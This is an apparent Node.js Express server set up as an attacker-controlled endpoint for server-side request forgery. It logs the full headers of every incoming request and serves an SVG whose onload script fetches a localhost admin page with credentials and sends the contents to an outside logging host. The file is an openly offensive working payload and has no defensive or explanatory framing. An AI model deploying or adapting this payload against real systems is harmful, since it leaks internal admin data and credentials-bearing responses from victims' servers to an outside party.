const express = require('express');
const app = express();

app.use((req, res) => {
  const requestDetails = {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.url,
    headers: req.headers,
    ip: req.ip
  };

  console.log('SSRF Request received:', JSON.stringify(requestDetails, null, 2));

  // Serve different content based on the path
  if (req.url === '/malicious-image.svg') {
    // Serve an SVG image that includes SSRF payload
    res.setHeader('Content-Type', 'image/svg+xml');
    res.send(`<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="fetch('http://localhost:8080/admin', {credentials: 'include'}).then(r => r.text()).then(d => { fetch('https://your-logger.com/log?data=' + encodeURIComponent(d)) });">
  <rect width="100" height="100" fill="red"/>
  <text x="50" y="50" text-anchor="middle" fill="white">SSRF</text>
</svg>`);
  } else if (req.url === '/log') {
    res.json({ status: 'ok', logs: 'Check console' });
  } else {
    // Redirect to a valid image
    res.redirect(302, 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj48cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgZmlsbD0icmVkIi8+PHRleHQgeD0iNTAiIHk9IjUwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSI+U1NSRjwvdGV4dD48L3N2Zz4=');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`SSRF server running on port ${PORT}`));
